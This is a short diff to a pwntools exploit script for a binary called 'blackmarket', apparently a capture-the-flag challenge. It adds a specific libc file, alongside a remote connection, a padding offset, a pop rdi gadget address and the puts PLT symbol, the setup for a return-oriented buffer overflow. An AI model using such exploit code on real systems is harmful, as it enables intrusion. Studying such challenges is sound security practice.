@@ -3,6 +3,7 @@ from pwn import *
 def exploit():
     p = remote("127.0.0.1", 8888)
     binary = ELF("./blackmarket")
+    libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
     padding = 184
     poprdi = 0x0000000000401f23
     plt_puts = binary.symbols["plt.puts"]
